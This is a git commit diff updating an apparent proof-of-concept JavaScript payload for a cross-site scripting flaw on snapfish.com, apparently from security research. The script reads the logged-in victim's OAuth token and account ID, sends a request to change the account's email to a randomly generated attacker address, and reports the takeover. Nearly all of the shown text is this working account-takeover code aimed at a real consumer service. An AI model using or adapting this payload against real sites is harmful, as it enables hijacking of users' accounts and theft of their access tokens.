2eb2db50c66cb73c5a8c69189f4b11d8cbd62d7f
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-01-12 20:48:34 +0100

    Update snapfish3.js

--- poc/shutterfly/snapfish3.js
+++ poc/shutterfly/snapfish3.js
@@ -1,15 +1,11 @@
 alert(document.domain);
 
-response = await fetch("https://www.snapfish.com/library/getOauthInfo");
-text = await response.json();
-access_token = text.oauthInfo.oa2;
-account_id = text.oauthInfo.accountId;
+url = "https://www.snapfish.com/library/getOauthInfo"
+access_token = "text.oauthInfo.oa2";
+account_id = "text.oauthInfo.oa2";
+attacker_email = "attacker" + (Math.random() + 1).toString(36).substring(7) + "@khara.one";
 
-const attacker_email = "attacker"+(Math.random() + 1).toString(36).substring(7)+"@khara.one";
-
-console.log( oa2_token );
-
-function submitRequest( oa2_token )
+function submitRequest()
 {
   var xhr = new XMLHttpRequest();
   xhr.open("POST", "https:\/\/www.snapfish.com\/library\/request_api", true);
@@ -26,6 +22,19 @@ function submitRequest( oa2_token )
     aBody[i] = body.charCodeAt(i); 
   xhr.send(new Blob([aBody]));
 }
-//submitRequest(oa2_token);
 
-console.log("Email( "+ account_id +" ) changed to "+ attacker_email );
+req = new XMLHttpRequest();
+req.responseType = 'json';
+req.open('GET', url, true);
+req.onload = function () {
+  var jsonResponse = req.response;
+  access_token = jsonResponse.oauthInfo.oa2;
+  account_id = jsonResponse.oauthInfo.accountId;
+  submitRequest();
+};
+req.send(null);
+
+setTimeout(() => { alert("Email( "+ account_id +" ) changed to "+ attacker_email );}, 5000);
+
+
+
